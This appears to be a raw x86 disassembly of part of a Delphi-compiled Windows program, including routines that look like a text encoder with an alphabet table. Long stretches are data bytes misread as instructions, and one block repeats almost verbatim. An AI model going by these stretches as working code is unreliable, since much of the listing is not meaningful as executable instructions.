call ebx
add eax 0x5
push eax
mov eax [ ebp - 0xc ]
call sub_404210
mov ecx eax
mov eax [ ebp - 0xc ]
pop edx
call sub_404470
mov eax [ ebp - 0xc ]
call sub_404210
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b05d
lea eax [ ebp - 0x28 ]
mov edx 0xa
call sub_403f74
retn
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x22
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
mov edx [ ebp - 0xc ]
call sub_403fa4
push 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
push 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
call sub_403fa4
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_4788dc
mov edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
call sub_403fa4
jmp r-xdata
sub_47b0ab
inc [ ecx ]
add [ eax ] al
add [ edx ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b2d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_47957c
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ eax + 0x40 ]
call sub_47ae68
pop ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b2dc
lea eax [ ebp - 0x30 ]
mov edx 0xb
call sub_403f74
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_419cc4
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ sub_47cb88 ]
call sub_47cffc
mov eax [ ebp - 0x8 ]
call sub_404210
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
sub al 0x9
je r-xdata
push ebp
lea ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_419cc4
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_419cc4
mov eax [ ebp - 0x30 ]
pop edx
call sub_47ae68
pop ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax ebx
mov edx [ rw-data ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
sub al 0x17
jne r-xdata
mov eax [ ebx + 0x70 ]
mov edx [ ebp - 0x8 ]
call sub_47d104
mov eax [ ebp - 0x4 ]
add eax 0x80
mov edx [ ebp - 0x8 ]
call sub_403fa4
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x7fffffff
mov edx 0x2
mov eax [ ebp - 0x10 ]
call sub_404470
mov eax [ ebp - 0x24 ]
mov ecx r-xdata
mov edx r-xdata
call sub_40ca98
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x6c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
lea ecx [ ebp - 0x18 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x7fffffff
mov edx 0x2
mov eax [ ebp - 0x10 ]
call sub_404470
push [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_4042d0
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_40ca98
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
sub_47b34c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_479594
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47b38c
push ebx
mov ebx edx
mov eax [ ebx + 0x6c ]
cmp [ eax + 0x28 ] 0x0
jle r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_403fa4
pop ebx
retn
cmp [ eax + 0x2c ] 0x0
jle r-xdata
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_403fa4
jmp r-xdata
pop ebx
retn
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_403fa4
sub_47b4d5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_47b5d6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax ebx
call sub_41aae4
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a148
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47b5b1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
jl r-xdata
cmp eax [ ebp - 0x18 ]
jb r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x39
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x30 ]
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_40425c
add [ ebp - 0x10 ] 0x39
adc [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
lea eax [ ebp - 0x4 ]
call j_sub_40441c
mov edx eax
mov eax esi
pop ecx
call sub_41ad28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b5b8
jmp r-xdata
sub_47b5e7
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
xor eax eax
push ebp
push sub_47b615
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b61c
retn
sub_47b620
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4794dc
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_4794a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b34c
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_479654
sub_47b6e9
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bl
adc [ edx ] al
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
cmovb eax [ eax ]
xor [ ebx + 0x54110047 ] bh
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add al dh
mov bh 0x47
add [ eax - 0x54000000 ] dh
mov dh 0x47
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
push ebp
inc ebp
inc edx
popad
jae r-xdata
xor eax [ eax ]
add [ eax - 0x67ffbdf0 ] dl
mov eax eax
inc esp
mov bh 0x47
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
inc edx
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bl
adc [ edx ] al
push ebp
inc ebp
inc edx
popad
jae r-xdata
add [ eax ] al
add [ eax + 0x3c004798 ] ch
pop ss
push ebp
inc ebp
mov eax eax
add al 0xb8
inc edi
add [ edi ] al
or eax 0x44644954
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
clc
mov dh 0x47
add [ edx + ebx * 4 + 0x47 ] dl
add [ ebx ] al
add [ edx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
sbb [ eax ] dl
inc edx
add [ eax + 0x4400418c ] dl
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
push ebp
inc ebp
mov esp 0x400047b7
mov bh 0x47
add [ ebx ] al
add [ edx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ ebx + edx + 0x42 ] al
add [ ebx + ecx * 4 + 0x141c0041 ] ch
push ebp
inc ebp
add [ eax ] al
mov eax eax
mov esp 0x47b7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
add [ ecx ] dl
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
add [ ebx + edx + 0x42 ] al
add [ ebx + ecx * 4 + 0x141c0041 ] ch
push ebp
inc ebp
add [ eax ] al
mov eax eax
js r-xdata
add [ eax ] al
add [ eax - 0x47 ] dh
push ebp
inc ebp
inc edx
popad
jae r-xdata
add [ edx + edi * 4 + 0x47 ] al
add [ eax + 0xd0047ba ] bl
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
inc edx
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov eax 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
mov eax 0x380047
add [ eax ] al
test al 0x98
inc edi
add [ edi + edx ] bh
xor eax [ eax ]
add [ eax - 0x67ffbdf0 ] dl
mov eax eax
les edi [ eax + 0x11070047 ]
push esp
dec ecx
inc ebp
outsb
inc edx
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bl
adc [ edx ] al
push ebp
inc ebp
inc edx
popad
jae r-xdata
cmp eax 0x41403f3e
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push ebp
inc ebp
mov eax eax
test [ ecx + 0xd070047 ] bh
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
js r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_403fa4
mov eax [ esi + 0x30 ]
mov al [ eax ]
mov [ esi + 0x34 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
pop ebx
pop esp
pop ebp
pop esi
pop edi
add [ eax ] al
add [ eax ] al
push ebx
push esi
test dl dl
je r-xdata
push ebp
inc ebp
cmp al 0xb9
inc edi
add al al
mov eax 0x40047
or cl [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
cmovb eax [ eax ]
jo r-xdata
adc eax 0x17540042
inc edi
add [ ecx + ebx * 4 + 0x47 ] cl
add [ eax + eax ] al
or cl [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
shl [ eax + ecx - 0x7d ] cl
push ebp
inc ebp
add [ eax ] al
mov eax eax
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add al bh
mov ecx 0xbc700047
inc edi
add [ 0x45644954 ] cl
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ ebx + edx + 0x42 ] al
add [ ebx + ecx * 4 + 0x141c0041 ] ch
push ebp
inc ebp
add [ eax ] al
mov eax eax
cmp al 0xb9
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 4 + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
arpl [ edi + 0x64 ] bp
jb r-xdata
inc edi
add [ eax ] bh
add [ eax ] al
add [ eax + edi * 4 ] ch
inc edi
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
sub_47b9af
inc [ eax ]
add [ eax ] al
pushad
and [ edx ] esp
and esp [ 0x29282726 ]
sub ch [ ebx ]
sub al 0x2d
das
xor [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
cmp bh [ ebx ]
cmp al 0x3d
aas
inc eax
inc ecx
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
pop ebx
pop esp
pop ebp
pop esi
pop edi
add [ eax ] al
add [ eax ] al
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_403fa4
mov eax [ esi + 0x30 ]
mov al [ eax ]
mov [ esi + 0x34 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47ba44
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x7e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47ba98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_47bb05
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ca98
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_47bb30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bb0c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_47bb30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_47bc62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bc69
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx esi [ ebx + eax + 0x2f ]
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4044b0
mov eax esi
mov ecx 0x3
cdq
idiv ecx
sub edx 0x1
jb r-xdata
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
lea eax [ ebp - 0x4 ]
call sub_40459c
jmp r-xdata
je r-xdata
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_479ae4
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
add edx 0x4
lea eax [ ebp - 0x4 ]
call sub_40459c
mov eax [ ebp - 0x4 ]
call sub_404210
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_40441c
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x2 ] dl
mov eax [ ebp - 0x4 ]
call sub_404210
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_40441c
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x1 ] dl
jmp r-xdata
dec edx
je r-xdata
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
add edx 0x4
lea eax [ ebp - 0x4 ]
call sub_40459c
mov eax [ ebp - 0x4 ]
call sub_404210
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_40441c
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x1 ] dl
jmp r-xdata
sub_47bc70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47bcfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41aac4
mov [ ebp - 0x8 ] eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_479cd4
mov eax esi
call sub_41aac4
push edx
push eax
mov eax [ ebp - 0x8 ]
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
add eax 0x1
adc edx 0x0
mov edx [ ebx + 0x30 ]
mov dl [ edx + eax - 0x1 ]
lea eax [ ebp - 0xc ]
call sub_404138
mov edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax edi
call sub_40425c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bd01
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_47bd0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47bd3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bd44
retn
mov eax rw-data
call sub_403f50
sub_47bf78
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x7e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47bfcc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47bffd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c004
retn
mov eax rw-data
call sub_403f50
sub_47c23f
rol [ edi ] 0xbc
xchg edx eax
inc edi
add [ 0x64491100 ] al
dec ebp
jae r-xdata
inc edx
add [ edi + edx + 0x42 ] dl
popad
inc ebx
outsd
jb r-xdata
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax ] ch
enter 0x47 0xf8
clc
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add [ eax - 0x3a ] ch
inc edi
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
jae r-xdata
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
push ebp
inc ebp
add [ eax ] al
test al 0xc2
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 8 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
retn 0x47
dec [ ebx - 0x5b450bbb ]
les eax [ edi ]
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ebx es
inc edi
add [ eax ] cl
add [ eax ] al
add [ ebx + edx * 4 ] bh
inc edi
push ebp
inc ebp
lea eax [ eax ]
add al 0xc3
inc edi
add [ edi ] al
adc al 0x54
dec ecx
dec ebp
jae r-xdata
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x1
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_404470
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
call sub_407f14
test al al
je r-xdata
clc
xor edx edx
call sub_4081f8
mov ebx eax
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404470
mov eax [ ebp - 0xc ]
mov edx r-xdata
outsb
outsw
push ebp
push ebp
inc ebp
lea eax [ eax ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_47c48d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x3
mov edx 0x7
mov eax [ ebp - 0x4 ]
call sub_404470
mov eax [ ebp - 0x8 ]
inc esp
xor [ eax ] eax
sub dh al
inc edi
add [ ebp + edx * 4 + 0x54180047 ] dh
dec ecx
dec ebp
jae r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
test ebx ebx
jle r-xdata
xor eax [ eax ]
cwde
xor eax [ eax ]
push ebp
inc ebp
test al 0xc2
inc edi
add [ eax ] ah
retn 0x47
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4794fc
mov ebx eax
mov esi ebx
lea eax [ esi + 0x68 ]
push eax
mov ecx 0x7fffffff
mov edx 0xb
mov eax [ ebp - 0x4 ]
call sub_404470
mov [ esi + 0x70 ] 0x2
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c494
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f74
retn
sub_47c299
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x6fffb909 ] dh
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax ] ch
enter 0x47 0xf8
clc
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add [ eax - 0x3a ] ch
inc edi
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
jae r-xdata
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
dec [ ebx - 0x5b450bbb ]
les eax [ edi ]
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ebx es
inc edi
add [ eax ] cl
add [ eax ] al
add [ ebx + edx * 4 ] bh
inc edi
push ebp
inc ebp
lea eax [ eax ]
add al 0xc3
inc edi
add [ edi ] al
adc al 0x54
dec ecx
dec ebp
jae r-xdata
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x1
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_404470
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
call sub_407f14
test al al
je r-xdata
clc
xor edx edx
call sub_4081f8
mov ebx eax
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404470
mov eax [ ebp - 0xc ]
mov edx r-xdata
outsb
outsw
push ebp
push ebp
inc ebp
lea eax [ eax ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_47c48d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x3
mov edx 0x7
mov eax [ ebp - 0x4 ]
call sub_404470
mov eax [ ebp - 0x8 ]
inc esp
xor [ eax ] eax
sub dh al
inc edi
add [ ebp + edx * 4 + 0x54180047 ] dh
dec ecx
dec ebp
jae r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
test ebx ebx
jle r-xdata
xor eax [ eax ]
cwde
xor eax [ eax ]
push ebp
inc ebp
test al 0xc2
inc edi
add [ eax ] ah
retn 0x47
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4794fc
mov ebx eax
mov esi ebx
lea eax [ esi + 0x68 ]
push eax
mov ecx 0x7fffffff
mov edx 0xb
mov eax [ ebp - 0x4 ]
call sub_404470
mov [ esi + 0x70 ] 0x2
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c494
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f74
retn
sub_47c4af
